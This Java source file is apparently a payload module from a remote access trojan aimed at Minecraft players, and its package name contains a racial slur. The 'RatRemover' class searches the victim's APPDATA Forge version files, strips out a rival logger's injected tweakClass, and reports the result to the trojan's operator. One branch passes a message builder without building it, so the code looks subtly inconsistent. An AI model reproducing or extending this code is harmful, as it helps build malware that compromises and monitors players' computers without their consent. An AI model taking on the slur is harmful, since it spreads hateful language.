package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.PayloadRegistry;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.Message;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;

public final class RatRemover implements Payload
{
    @Override
    public void execute() throws Exception
    {
        File file2 = new File(System.getenv("APPDATA") + "\\.minecraft\\versions");
        if (file2.isDirectory())
            for (File file1 : Objects.requireNonNull(file2.listFiles()))
                if (file1.isDirectory())
                    for (File file : Objects.requireNonNull(file1.listFiles()))
                        if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge"))
                        {
                            String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath())), StandardCharsets.UTF_8);
                            if (json.contains("--tweakClass net.minecraftforge.apiloader.APILoader"))
                            {
                                Sender.send(new Message.Builder("LOGGER FOUND! REMOVING...").build());
                                json = json.replace("--tweakClass net.minecraftforge.apiloader.APILoader", "");
                                Files.write(Paths.get(file.getAbsolutePath()), json.getBytes(StandardCharsets.UTF_8));
                                PayloadRegistry.getPayload(RatRemover.class).ifPresent(payload -> { try { payload.execute(); } catch (Exception ignored) { } });
                            }
                            else Sender.send(new Message.Builder("NO LOGGER FOUND!"));
                        }
    }
}
